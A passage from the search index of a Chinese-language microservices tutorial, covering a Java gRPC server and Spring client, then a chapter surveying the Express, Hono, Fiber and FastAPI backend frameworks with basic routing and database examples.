build/generated/source/proto/main/java/io/github/fingerbone/demo \u76ee\u5f55\u4e0b\u3002\u5f53\u7136\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5f88\u590d\u6742\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e9b\u6587\u4ef6\u3002 \u8981\u5b9e\u73b0\u670d\u52a1\uff0c\u9700\u8981\u7ee7\u627f\u751f\u6210\u7684 Service\uff0c package io.github.fingerbone.demo; import io.grpc.stub.StreamObserver; import java.util.HashMap; import java.util.Map; public class EmailServiceImpl extends EmailServiceGrpc.EmailServiceImplBase { private final Map<Integer, Person> personMap = new HashMap<>(); @Override public void getPersonById(PersonId request, StreamObserver<Person> responseObserver) { Person person = personMap.get(request.getId()); if (person != null) { responseObserver.onNext(person); } else { responseObserver.onError(new Exception(\"Person not found\")); } responseObserver.onCompleted(); } @Override public void addPerson(Person request, StreamObserver<PersonId> responseObserver) { personMap.put(request.getId(), request); PersonId personId = PersonId.newBuilder().setId(request.getId()).build(); responseObserver.onNext(personId); responseObserver.onCompleted(); } } \u4f46\u662f\uff0c\u73b0\u5728\u53ea\u662f\u5b9e\u73b0\u4e86\u670d\u52a1\uff0c\u8fd8\u6ca1\u6709\u542f\u52a8\u670d\u52a1\u3002\u8981\u542f\u52a8\u670d\u52a1\uff0c\u9700\u8981\u4f7f\u7528 Server \u7c7b\uff0c package io.github.fingerbone.demo; import java.io.IOException; import io.grpc.Server; import io.grpc.ServerBuilder; public class Application { public static void main(String[] args) throws IOException, InterruptedException { Server server = ServerBuilder.forPort(8080) .addService(new EmailServiceImpl()) .build(); server.start(); server.awaitTermination(); } } \u7136\u540e\uff0c\u5728 gradle \u4e2d\u8bbe\u7f6e\u542f\u52a8\u7c7b\uff0c application { // Define the main class for the application. mainClass = 'io.github.fingerbone.demo.Application' } \u4f7f\u7528 gradle run \u542f\u52a8\u670d\u52a1\u3002 \u73b0\u5728\u53ef\u4ee5\u7528 Postman \u8fdb\u884c\u8c03\u8bd5\uff0c\u8f93\u5165\u5730\u5740\u5e76\u5bfc\u5165 proto \u6587\u4ef6\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e86\u3002 \u4e0d\u8fc7\uff0c\u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\u662f\u5f00\u542f\u53cd\u5c04\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 RPC \u4fe1\u606f\u3002 \u5728\u4f9d\u8d56\u4e2d\u52a0\u5165\uff0c implementation 'io.grpc:grpc-services:1.42.1' \u7136\u540e\u6dfb\u52a0\u53cd\u5c04\u670d\u52a1\uff0c public static void main(String[] args) throws IOException, InterruptedException { Server server = ServerBuilder.forPort(8080) .addService(new EmailServiceImpl()) .addService(ProtoReflectionService.newInstance()) .build(); server.start(); server.awaitTermination(); } \u73b0\u5728\uff0c\u5728 Postman \u4e2d\u4f7f\u7528 gRPC\uff0c\u7136\u540e\u8f93\u5165\u5730\u5740\uff0c\u5728\u8fc7\u7a0b\u9009\u62e9\u91cc\u4f7f\u7528\u53cd\u5c04\u81ea\u52a8\u83b7\u53d6\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e86\u3002","title":"\u670d\u52a1\u7aef\u5b9e\u73b0"},{"location":"18/#_6","text":"\u5ba2\u6237\u7aef\u8981\u5f15\u7528\u76f8\u540c\u7684\u5e93\uff0c\u5e76\u8fdb\u884c\u76f8\u540c\u7684\u914d\u7f6e\u548c\u7f16\u8bd1\u3002\u5982\u679c\u662f\u591a\u4f53\u9879\u76ee\uff0c\u6700\u597d\u5c06 proto \u6587\u4ef6\u5355\u72ec\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5728\u5176\u4ed6\u9879\u76ee\u4e2d\u5f15\u7528\u3002 \u5ba2\u6237\u7aef\u8981\u4f7f\u7528\uff0c implementation 'net.devh:grpc-client-spring-boot-starter' implementation project(':grpc-lib') \u7136\u540e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\uff0c grpc: client: address: default: host: localhost port: 8080 \u7136\u540e\u5728\u914d\u7f6e\u7c7b\u4e2d\u52a0\u5165\uff0c @Configuration public class GrpcConfig { @Bean public ManagedChannel managedChannel() { return ManagedChannelBuilder.forAddress(\"localhost\", 8080) .usePlaintext() .build(); } @Bean public EmailServiceGrpc.EmailServiceBlockingStub emailServiceBlockingStub(ManagedChannel managedChannel) { return EmailServiceGrpc.newBlockingStub(managedChannel); } } \u7136\u540e\u5728\u670d\u52a1\u4e2d\u4f7f\u7528\uff0c @Service public class EmailService { @Autowired private EmailServiceGrpc.EmailServiceBlockingStub emailServiceBlockingStub; public Person getPersonById(int id) { return emailServiceBlockingStub.getPersonById(PersonId.newBuilder().setId(id).build()); } public PersonId addPerson(Person person) { return emailServiceBlockingStub.addPerson(person); } } \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u6837\u5b50\uff0c\u8fdc\u7a0b\u7684\u670d\u52a1\u5c31\u53ef\u4ee5\u50cf\u8c03\u7528\u672c\u5730\u670d\u52a1\u4e00\u6837\u8c03\u7528\u4e86\u3002","title":"\u5ba2\u6237\u7aef\u5b9e\u73b0"},{"location":"19/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch19 \u540e\u7aef\u6846\u67b6\u4e00\u89c8 \u73b0\u5728\uff0c\u6211\u4eec\u5bf9 Spring \u4e0e Java \u6280\u672f\u6808\u7684\u5b66\u4e60\u6b63\u5f0f\u7ed3\u675f\u3002\u4e0b\u4e00\u90e8\u5206\u662f\u57fa\u4e8e k8s \u7684\u5fae\u670d\u52a1\u3002\u4f46\u4e3a\u4e86\u907f\u514d\u5927\u91cf\u7684 boilerplate\uff0c\u6211\u4eec\u4e0d\u518d\u4f7f\u7528 Spring \u5f00\u53d1\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 Javascript \u7684 hono \u6846\u67b6\u6765\u8fdb\u884c k8s \u5fae\u670d\u52a1\u7684\u5b9e\u73b0\u3002 \u5728\u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u4f1a\u5bf9\u540e\u7aef\u6846\u67b6\u8fdb\u884c\u4e00\u4e2a\u7b80\u5355\u7684\u6982\u89c8\u3002\u8fd9\u4e9b\u6846\u67b6\u90fd\u662f\u540e\u7aef\u5f00\u53d1\u4e2d\u5e38\u7528\u7684\u6846\u67b6\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u4f1a\u6df1\u5165\u8bb2\u89e3\u3002 \u73b0\u4ee3\u7684\u540e\u7aef\u6846\u67b6\u57fa\u672c\u90fd\u662f\u57fa\u4e8e\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\uff0c\u800c\u975e\u50cf Spring \u4e00\u6837\u9762\u5411\u5bf9\u8c61\u5e76\u57fa\u4e8e\u6ce8\u89e3\u3002\u8bda\u7136\uff0cSpring \u73b0\u5728\u4e5f\u63d0\u4f9b\u4e86\u51fd\u6570\u5f0f\u8def\u7531\uff0c\u4f46\u7528\u7684\u4eba\u5f88\u5c11\u3002 Spring \u6211\u4eec\u524d\u9762\u5df2\u7ecf\u5b66\u4e60\u8fc7\u4e86 Java \u548c\u5176\u6280\u672f\u6808\u4e0a\u7684 Spring \u6846\u67b6\u3002 Express Express \u662f\u4e00\u4e2a\u7b80\u6d01\u800c\u7075\u6d3b\u7684 Node.js Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a Node.js \u9879\u76ee\uff0c\u5e76\u5b89\u88c5 Express\u3002\u8fd9\u91cc\u6211\u4eec\u4e00\u5e76\u5e26\u4e0a Typescript\u3002 npm init -y npm install express npm install typescript \u7136\u540e\uff0c\u521b\u5efa\u4e00\u4e2a app.ts \u6587\u4ef6\uff0c import express from 'express'; const app = express(); const port = 3000; app.get('/', (req, res) => { res.send('Hello World!'); }); app.listen(port, () => { console.log(`Example app listening at http://localhost:${port}`); }); \u53ef\u4ee5\u770b\u5230\uff0c\u51fd\u6570\u5f0f\u7684\u540e\u7aef\u5f00\u53d1\u662f\u57fa\u4e8e\u56de\u8c03\u7684\u3002\u5728 express \u4e2d\uff0c\u4f7f\u7528 app.get \u6765\u5b9a\u4e49\u8def\u7531\uff0c\u7136\u540e\u4f20\u5165\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002 express \u7684\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f req \u548c res \uff0c\u5206\u522b\u662f\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd4\u56de\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 req \u5bf9\u8c61\u8868\u793a HTTP \u8bf7\u6c42\uff0c\u5305\u542b\u4e86\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u4f8b\u5982 URL\u3001HTTP \u5934\u548c\u8bf7\u6c42\u4f53\u3002 res \u5bf9\u8c61\u8868\u793a HTTP \u54cd\u5e94\uff0c\u7528\u4e8e\u53d1\u9001\u54cd\u5e94\u6570\u636e\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c app.get('/hello/:name', (req, res) => { res.send(`Hello, ${req.params.name}`); }); app.get('/hello', (req, res) => { const name = req.query.name; res.send(`Hello, ${name}`); }); app.post('/hello', (req, res) => { const name = req.body.name; res.send(`Hello, ${name}`); }); \u5982\u679c\u8981\u53d1\u9001 JSON \u6216\u8005\u5176\u4ed6\u6570\u636e\uff0c app.get('/json', (req, res) => { res.json({ message: 'Hello World!' }); }); app.get('/file', (req, res) => { res.sendFile('path/to/file'); }); \u5bf9\u4e8e\u6570\u636e\u5e93 client\uff0c\u8fd9\u91cc\u4f7f\u7528 postgres\uff0c\u53ea\u8981\uff0c import { Client } from 'pg'; const client = new Client(); client.connect(); app.get('/db', async (req, res) => { const result = await client.query('SELECT * FROM table'); res.json(result.rows); }); \u6ca1\u6709\u590d\u6742\u7684\u4f9d\u8d56\u6ce8\u5165\uff0c\u95ed\u5305\u7684\u6355\u83b7\u4ee3\u66ff\u4e86\u4f9d\u8d56\u6ce8\u5165\u3002 Hono Express \u662f Node.js \u7684\u6846\u67b6\uff0c\u800c Hono \u53ef\u4ee5\u8bf4\u662f Bun \u7684\u4ee3\u8868\u6846\u67b6\u3002 Bun \u662f\u4e00\u4e2a\u65b0\u5174\u7684 JavaScript \u8fd0\u884c\u65f6\uff0c\u6bd4\u8d77 Node.js \u5f3a\u5927\u5f88\u591a\u3002\u4e00\u65b9\u9762\uff0c\u5b83\u901f\u5ea6\u5feb\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u5b83\u8fd8\u6709\u8bb8\u591a\u5185\u7f6e\u7279\u6027\uff0c\u4f8b\u5982\u539f\u751f\u652f\u6301 Typescript\u3002\u6b64\u5916\uff0cBun \u76ee\u524d\u4e0e Node.js \u5728\u9664\u4e86 v8 \u5f15\u64ce\u7684\u6240\u6709\u65b9\u9762\u90fd\u57fa\u672c\u662f\u5b8c\u5168\u517c\u5bb9\u7684\u3002\u6b64\u5916\uff0cBun \u7684\u547d\u4ee4\u4e5f\u548c Node.js \u6216 npm \u57fa\u672c\u4e00\u81f4\uff0c\u5b8c\u5168\u6ca1\u6709\u5b66\u4e60\u6210\u672c\u3002 Hono \u662f\u4e00\u4e2a\u65b0\u7684 Web \u540e\u7aef\u6846\u67b6\uff0c\u4e5f\u662f\u51fd\u6570\u5f0f\u7684\u3002\u5f53\u7136\uff0c\u5b83\u4e5f\u652f\u6301\u57fa\u4e8e Node.js\u3002 const app = new Hono() app.get('/', (c) => c.text('Hello Bun!')) export default app \u6700\u540e\uff0c\u4f7f\u7528 bun run dev \u542f\u52a8\u670d\u52a1\u5373\u53ef\u3002 \u8fd9\u91cc\u7684 c \u662f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u5b83\u5305\u542b\u4e86\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u6240\u6709\u4fe1\u606f\u3002 c.text \u662f\u4e00\u4e2a\u5feb\u6377\u65b9\u6cd5\uff0c\u7528\u4e8e\u8fd4\u56de\u6587\u672c\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c import { Hono } from 'hono' const app = new Hono() app.get('/hello/:name', async (c) => c.text(`Hello, ${c.req.param('name')}`)) app.get('/hello', async (c) => { const name = c.req.query('name') return c.text(`Hello, ${name}`) }) app.post('/hello', async (c) => { const body = await c.req.parseBody() const name = body.name return c.text(`Hello, ${name}`) }) export default app \u4e4b\u540e\u6211\u4eec\u4f1a\u4f7f\u7528 Hono \u6765\u5f00\u53d1 k8s \u5fae\u670d\u52a1\u3002 Fiber Fiber \u662f Go \u8bed\u8a00\u7684 Web \u6846\u67b6\u4e4b\u4e00\uff0c\u5b83\u662f Go \u8bed\u8a00\u540e\u7aef\u6846\u67b6\u4e2d\u5e76\u53d1\u6700\u9ad8\u7684\u3002 package main import \"github.com/gofiber/fiber/v2\" func main() { app := fiber.New() app.Get(\"/\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, World!\") }) app.Listen(\":3000\") } fiber \u672c\u8d28\u662f\u5bf9 Go \u8bed\u8a00\u7684 net/http \u5305\u7684\u5c01\u88c5\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c app.Get(\"/hello/:name\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Params(\"name\")) }) app.Get(\"/hello\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Query(\"name\")) }) app.Post(\"/hello\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Body(\"name\")) }) \u5982\u679c\u8981\u53d1\u9001 JSON \u6216\u8005\u5176\u4ed6\u6570\u636e\uff0c app.Get(\"/json\", func(c *fiber.Ctx) error { return c.JSON(fiber.Map{\"message\": \"Hello, World!\"}) }) app.Get(\"/file\", func(c *fiber.Ctx) error { return c.SendFile(\"path/to/file\") }) \u53ef\u4ee5\u770b\u51fa\u6765\uff0cfiber \u548c hono \u975e\u5e38\u76f8\u4f3c\u3002 \u5982\u679c\u8981\u4f7f\u7528\u6570\u636e\u5e93 client\uff0c import \"github.com/jackc/pgx/v4\" func main() { conn, err := pgx.Connect(context.Background(), \"postgresql://user:password@localhost:5432/database\") if err != nil { log.Fatalf(\"Unable to connect to database: %v\\n\", err) } defer conn.Close() app.Get(\"/db\", func(c *fiber.Ctx) error { rows, err := conn.Query(context.Background(), \"SELECT * FROM table\") if err != nil { return err } defer rows.Close() var result []string for rows.Next() { var name string if err := rows.Scan(&name); err != nil { return err } result = append(result, name) } return c.JSON(result) }) app.Listen(\":3000\") } \u548c express \u4e00\u6837\uff0cfiber \u4e5f\u662f\u4f7f\u7528\u56de\u8c03\u6355\u83b7\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u4f9d\u8d56\u6ce8\u5165\u3002 FastAPI Python \u6709\u4e09\u4e2a\u4e3b\u8981\u7684 Web \u6846\u67b6\uff0c\u5206\u522b\u662f Django\u3001Flask \u548c FastAPI\u3002FastAPI \u662f\u6700\u65b0\u7684\u4e00\u4e2a\uff0c\u4e5f\u662f\u6700\u5feb\u7684\u4e00\u4e2a\u3002 from fastapi import FastAPI, APIRouter app = FastAPI() router = APIRouter() @router.get(\"/\") async def read_root(): return {\"Hello\": \"World\"} app.include_router(router, prefix=\"/api\") @app.get(\"/ping\") async def pong(): return {\"ping\": \"pong!\"} if __name__ == \"__main__\": import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8000) \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c @app.get(\"/hello/{name}\") async def hello(name: str): return {\"Hello\": name} @app.get(\"/hello\") async def hello(name: str): return {\"Hello\": name} class Item(BaseModel): name: str @app.post(\"/hello\") async def hello(item: Item): return {\"Hello\": item.name} \u5982\u679c\u8981\u505a\u4f9d\u8d56\u6ce8\u5165\uff0c\u9700\u8981\u4f7f\u7528 Depends \uff0c from fastapi import Depends def get_db(): db = SessionLocal() try: yield db finally: db.close() @app.get(\"/db\") async def db(db: Session = Depends(get_db)): return db.query(Table).all()","title":"\u540e\u7aef\u6846\u67b6\u4e00\u89c8"},{"location":"19/#ch19","text":"\u73b0\u5728\uff0c\u6211\u4eec\u5bf9 Spring \u4e0e Java \u6280\u672f\u6808\u7684\u5b66\u4e60\u6b63\u5f0f\u7ed3\u675f\u3002\u4e0b\u4e00\u90e8\u5206\u662f\u57fa\u4e8e k8s \u7684\u5fae\u670d\u52a1\u3002\u4f46\u4e3a\u4e86\u907f\u514d\u5927\u91cf\u7684 boilerplate\uff0c\u6211\u4eec\u4e0d\u518d\u4f7f\u7528 Spring \u5f00\u53d1\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 Javascript \u7684 hono \u6846\u67b6\u6765\u8fdb\u884c k8s \u5fae\u670d\u52a1\u7684\u5b9e\u73b0\u3002 \u5728\u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u4f1a\u5bf9\u540e\u7aef\u6846\u67b6\u8fdb\u884c\u4e00\u4e2a\u7b80\u5355\u7684\u6982\u89c8\u3002\u8fd9\u4e9b\u6846\u67b6\u90fd\u662f\u540e\u7aef\u5f00\u53d1\u4e2d\u5e38\u7528\u7684\u6846\u67b6\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u4f1a\u6df1\u5165\u8bb2\u89e3\u3002 \u73b0\u4ee3\u7684\u540e\u7aef\u6846\u67b6\u57fa\u672c\u90fd\u662f\u57fa\u4e8e\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\uff0c\u800c\u975e\u50cf Spring \u4e00\u6837\u9762\u5411\u5bf9\u8c61\u5e76\u57fa\u4e8e\u6ce8\u89e3\u3002\u8bda\u7136\uff0cSpring \u73b0\u5728\u4e5f\u63d0\u4f9b\u4e86\u51fd\u6570\u5f0f\u8def\u7531\uff0c\u4f46\u7528\u7684\u4eba\u5f88\u5c11\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch19 \u540e\u7aef\u6846\u67b6\u4e00\u89c8"},{"location":"19/#spring","text":"\u6211\u4eec\u524d\u9762\u5df2\u7ecf\u5b66\u4e60\u8fc7\u4e86 Java \u548c\u5176\u6280\u672f\u6808\u4e0a\u7684 Spring \u6846\u67b6\u3002","title":"Spring"},{"location":"19/#express","text":"Express \u662f\u4e00\u4e2a\u7b80\u6d01\u800c\u7075\u6d3b\u7684 Node.js Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a Node.js \u9879\u76ee\uff0c\u5e76\u5b89\u88c5 Express\u3002\u8fd9\u91cc\u6211\u4eec\u4e00\u5e76\u5e26\u4e0a Typescript\u3002 npm init -y npm install express npm install typescript \u7136\u540e\uff0c\u521b\u5efa\u4e00\u4e2a app.ts \u6587\u4ef6\uff0c import express from 'express'; const app = express(); const port = 3000; app.get('/', (req, res) => { res.send('Hello World!'); }); app.listen(port, () => { console.log(`Example app listening at http://localhost:${port}`); }); \u53ef\u4ee5\u770b\u5230\uff0c\u51fd\u6570\u5f0f\u7684\u540e\u7aef\u5f00\u53d1\u662f\u57fa\u4e8e\u56de\u8c03\u7684\u3002\u5728 express \u4e2d\uff0c\u4f7f\u7528 app.get \u6765\u5b9a\u4e49\u8def\u7531\uff0c\u7136\u540e\u4f20\u5165\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002 express \u7684\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f req \u548c res \uff0c\u5206\u522b\u662f\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd4\u56de\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 req \u5bf9\u8c61\u8868\u793a HTTP \u8bf7\u6c42\uff0c\u5305\u542b\u4e86\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u4f8b\u5982 URL\u3001HTTP \u5934\u548c\u8bf7\u6c42\u4f53\u3002 res \u5bf9\u8c61\u8868\u793a HTTP \u54cd\u5e94\uff0c\u7528\u4e8e\u53d1\u9001\u54cd\u5e94\u6570\u636e\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c app.get('/hello/:name', (req, res) => { res.send(`Hello, ${req.params.name}`); }); app.get('/hello', (req, res) => { const name = req.query.name; res.send(`Hello, ${name}`); }); app.post('/hello', (req, res) => { const name = req.body.name; res.send(`Hello, ${name}`); }); \u5982\u679c\u8981\u53d1\u9001 JSON \u6216\u8005\u5176\u4ed6\u6570\u636e\uff0c app.get('/json', (req, res) => { res.json({ message: 'Hello World!' }); }); app.get('/file', (req, res) => { res.sendFile('path/to/file'); }); \u5bf9\u4e8e\u6570\u636e\u5e93 client\uff0c\u8fd9\u91cc\u4f7f\u7528 postgres\uff0c\u53ea\u8981\uff0c import { Client } from 'pg'; const client = new Client(); client.connect(); app.get('/db', async (req, res) => { const result = await client.query('SELECT * FROM table'); res.json(result.rows); }); \u6ca1\u6709\u590d\u6742\u7684\u4f9d\u8d56\u6ce8\u5165\uff0c\u95ed\u5305\u7684\u6355\u83b7\u4ee3\u66ff\u4e86\u4f9d\u8d56\u6ce8\u5165\u3002","title":"Express"},{"location":"19/#hono","text":"Express \u662f Node.js \u7684\u6846\u67b6\uff0c\u800c Hono \u53ef\u4ee5\u8bf4\u662f Bun \u7684\u4ee3\u8868\u6846\u67b6\u3002 Bun \u662f\u4e00\u4e2a\u65b0\u5174\u7684 JavaScript \u8fd0\u884c\u65f6\uff0c\u6bd4\u8d77 Node.js \u5f3a\u5927\u5f88\u591a\u3002\u4e00\u65b9\u9762\uff0c\u5b83\u901f\u5ea6\u5feb\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u5b83\u8fd8\u6709\u8bb8\u591a\u5185\u7f6e\u7279\u6027\uff0c\u4f8b\u5982\u539f\u751f\u652f\u6301 Typescript\u3002\u6b64\u5916\uff0cBun \u76ee\u524d\u4e0e Node.js \u5728\u9664\u4e86 v8 \u5f15\u64ce\u7684\u6240\u6709\u65b9\u9762\u90fd\u57fa\u672c\u662f\u5b8c\u5168\u517c\u5bb9\u7684\u3002\u6b64\u5916\uff0cBun \u7684\u547d\u4ee4\u4e5f\u548c Node.js \u6216 npm \u57fa\u672c\u4e00\u81f4\uff0c\u5b8c\u5168\u6ca1\u6709\u5b66\u4e60\u6210\u672c\u3002 Hono \u662f\u4e00\u4e2a\u65b0\u7684 Web \u540e\u7aef\u6846\u67b6\uff0c\u4e5f\u662f\u51fd\u6570\u5f0f\u7684\u3002\u5f53\u7136\uff0c\u5b83\u4e5f\u652f\u6301\u57fa\u4e8e Node.js\u3002 const app = new Hono() app.get('/', (c) => c.text('Hello Bun!')) export default app \u6700\u540e\uff0c\u4f7f\u7528 bun run dev \u542f\u52a8\u670d\u52a1\u5373\u53ef\u3002 \u8fd9\u91cc\u7684 c \u662f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u5b83\u5305\u542b\u4e86\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u6240\u6709\u4fe1\u606f\u3002 c.text \u662f\u4e00\u4e2a\u5feb\u6377\u65b9\u6cd5\uff0c\u7528\u4e8e\u8fd4\u56de\u6587\u672c\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c import { Hono } from 'hono' const app = new Hono() app.get('/hello/:name', async (c) => c.text(`Hello, ${c.req.param('name')}`)) app.get('/hello', async (c) => { const name = c.req.query('name') return c.text(`Hello, ${name}`) }) app.post('/hello', async (c) => { const body = await c.req.parseBody() const name = body.name return c.text(`Hello, ${name}`) }) export default app \u4e4b\u540e\u6211\u4eec\u4f1a\u4f7f\u7528 Hono \u6765\u5f00\u53d1 k8s \u5fae\u670d\u52a1\u3002","title":"Hono"},{"location":"19/#fiber","text":"Fiber \u662f Go \u8bed\u8a00\u7684 Web \u6846\u67b6\u4e4b\u4e00\uff0c\u5b83\u662f Go \u8bed\u8a00\u540e\u7aef\u6846\u67b6\u4e2d\u5e76\u53d1\u6700\u9ad8\u7684\u3002 package main import \"github.com/gofiber/fiber/v2\" func main() { app := fiber.New() app.Get(\"/\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, World!\") }) app.Listen(\":3000\") } fiber \u672c\u8d28\u662f\u5bf9 Go \u8bed\u8a00\u7684 net/http \u5305\u7684\u5c01\u88c5\u3002 \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c app.Get(\"/hello/:name\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Params(\"name\")) }) app.Get(\"/hello\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Query(\"name\")) }) app.Post(\"/hello\", func(c *fiber.Ctx) error { return c.SendString(\"Hello, \" + c.Body(\"name\")) }) \u5982\u679c\u8981\u53d1\u9001 JSON \u6216\u8005\u5176\u4ed6\u6570\u636e\uff0c app.Get(\"/json\", func(c *fiber.Ctx) error { return c.JSON(fiber.Map{\"message\": \"Hello, World!\"}) }) app.Get(\"/file\", func(c *fiber.Ctx) error { return c.SendFile(\"path/to/file\") }) \u53ef\u4ee5\u770b\u51fa\u6765\uff0cfiber \u548c hono \u975e\u5e38\u76f8\u4f3c\u3002 \u5982\u679c\u8981\u4f7f\u7528\u6570\u636e\u5e93 client\uff0c import \"github.com/jackc/pgx/v4\" func main() { conn, err := pgx.Connect(context.Background(), \"postgresql://user:password@localhost:5432/database\") if err != nil { log.Fatalf(\"Unable to connect to database: %v\\n\", err) } defer conn.Close() app.Get(\"/db\", func(c *fiber.Ctx) error { rows, err := conn.Query(context.Background(), \"SELECT * FROM table\") if err != nil { return err } defer rows.Close() var result []string for rows.Next() { var name string if err := rows.Scan(&name); err != nil { return err } result = append(result, name) } return c.JSON(result) }) app.Listen(\":3000\") } \u548c express \u4e00\u6837\uff0cfiber \u4e5f\u662f\u4f7f\u7528\u56de\u8c03\u6355\u83b7\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u4f9d\u8d56\u6ce8\u5165\u3002","title":"Fiber"},{"location":"19/#fastapi","text":"Python \u6709\u4e09\u4e2a\u4e3b\u8981\u7684 Web \u6846\u67b6\uff0c\u5206\u522b\u662f Django\u3001Flask \u548c FastAPI\u3002FastAPI \u662f\u6700\u65b0\u7684\u4e00\u4e2a\uff0c\u4e5f\u662f\u6700\u5feb\u7684\u4e00\u4e2a\u3002 from fastapi import FastAPI, APIRouter app = FastAPI() router = APIRouter() @router.get(\"/\") async def read_root(): return {\"Hello\": \"World\"} app.include_router(router, prefix=\"/api\") @app.get(\"/ping\") async def pong(): return {\"ping\": \"pong!\"} if __name__ == \"__main__\": import uvicorn uvicorn.run(app, host=\"0.0.0.0\", port=8000) \u5982\u679c\u8981\u83b7\u53d6\u53c2\u6570\uff0c @app.get(\"/hello/{name}\") async def hello(name: str): return {\"Hello\": name} @app.get(\"/hello\") async def hello(name: str): return {\"Hello\": name} class Item(BaseModel): name: str @app.post(\"/hello\") async def hello(item: Item): return {\"Hello\": item.name} \u5982\u679c\u8981\u505a\u4f9d\u8d56\u6ce8\u5165\uff0c\u9700\u8981\u4f7f\u7528 Depends \uff0c from fastapi import Depends def get_db(): db = SessionLocal() try: yield db finally: db.close() @app.get(\"/db\") async def db(db: Session = Depends(get_db)): return db.query(Table).all()","title":"FastAPI"},{"location":"20/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch20 k8s \u65e0\u72b6\u6001\u670d\u52a1\u57fa\u672c\u90e8\u7f72 \u7ec8\u4e8e\u6765\u5230\u4e86\u672c\u7cfb\u5217\u7b2c\u4e8c\u4e2a\u91cd\u70b9\uff0ckubernetes\uff0c\u7b80\u79f0 k8s\u3002 \u901a\u8fc7\u6211\u4eec\u524d\u9762\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u4e86\u89e3\u4e86\u5fae\u670d\u52a1\u67b6\u6784\u7684\u57fa\u672c\u6982\u5ff5\u3002\u4f46\u662f\uff0c\u6bcf\u4e2a\u5fae\u670d\u52a1\u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u5b83\u4eec\u9700\u8981\u72ec\u7acb\u90e8\u7f72\u3001\u72ec\u7acb\u6269\u5c55\u3001\u72ec\u7acb\u76d1\u63a7\u3002 \u5bb9\u5668\u5316\u6280\u672f\u89e3\u51b3\u4e86\u670d\u52a1\u7684\u72ec\u7acb\u90e8\u7f72\u95ee\u9898\uff0c\u800c k8s \u5219\u89e3\u51b3\u4e86\u670d\u52a1\u7684\u72ec\u7acb\u6269\u5c55\u3001\u72ec\u7acb\u76d1\u63a7\u95ee\u9898\u3002k8s \u5c31\u662f\u4e00\u4e2a\u5bb9\u5668\u7684\u7ba1\u7406\u5e73\u53f0\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u5927\u91cf\u7684\u5bb9\u5668\uff0c\u8ba9\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u65b9\u4fbf\u5730\u90e8\u7f72\u3001\u6269\u5c55\u3001\u76d1\u63a7\u6211\u4eec\u7684\u670d\u52a1\u3002 minikube k8s \u6709\u8bb8\u591a\u4e2a\u5b9e\u73b0\uff0c\u751f\u4ea7\u73af\u5883\u4e2d\u5c31\u662f\u4f7f\u7528\u7684 